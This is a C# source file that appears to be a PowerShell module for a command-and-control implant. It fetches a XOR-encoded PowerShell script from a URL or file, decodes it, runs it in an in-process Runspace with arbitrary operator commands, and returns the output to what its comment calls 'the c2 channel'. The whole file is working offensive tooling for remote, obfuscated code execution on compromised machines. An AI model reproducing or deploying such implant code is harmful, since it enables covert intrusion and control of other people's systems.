using System;
using System.Text;
using System.IO;
using System.Collections.Generic;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Management.Automation.Host;
using System.Linq;

namespace Application 
{
    public static class PowershellModule
    {
        public static Dictionary<string,string> GetInstructions()
        {
            Dictionary<string,string> menuextensions = new Dictionary<string,string>(){
                {"powershell-import", "Run powershell a script with a module imported (powershell file/url XORKey URI SCRIPTCONTENT)"},
                {"powershell", "Run a powershell script (powershell SCRIPTCONTENT)"},               
            };
            return menuextensions;
        }

        public static void Operate(string[] instruction) {
            // define the variables
            string loc = null;
            string psscript = null;
            string[] parameters;

            switch (instruction[0])
            {
                case "powershell-import":
                    string xorkey = instruction[2];
                    loc = instruction[3];
                    byte[] scxor;
                    if (instruction[1] == "url") {                        
                        scxor = Program.GetContent(loc);
                    }
                    else {
                        scxor = File.ReadAllBytes(loc);
                    }
                    Console.WriteLine("Powershell scripting is starting...");
                    psscript = Encoding.UTF8.GetString(Program.XOR(scxor,xorkey));
                    // skip the content before parameters
                    parameters = instruction.Skip(4).ToArray();
                    ExecPowershellAutomation(psscript,parameters);
                    break;
                case "powershell":
                    Console.WriteLine("Powershell scripting is starting...");
                    // skip the content before parameters
                    parameters = instruction.Skip(1).ToArray();
                    ExecPowershellAutomation(null,parameters);
                    break;                              
                default:
                    Console.WriteLine("instruction couldn't be found in powershell module");
                    break;
            }
        }

        public static void ExecPowershellAutomation(string pscontent, string[] arguments, bool wait = true)
        {
            // create Runspace and Pipeline
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            Pipeline pipeline = runspace.CreatePipeline();

            if (pscontent != null) {
                // include the powershell script given
                pipeline.Commands.AddScript(pscontent);
            }
            
            // add additional commands if given
            pipeline.Commands.AddScript(String.Join(" ",arguments));


            // invoke the pipeline and collect the output
            System.Collections.ObjectModel.Collection<PSObject> output = pipeline.Invoke();
            runspace.Close();

            // convert the output to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in output)
            {
                stringBuilder.AppendLine(obj.ToString());
            }

            // send it to the c2 channel
            Console.WriteLine(stringBuilder.ToString());
        }

    }
}

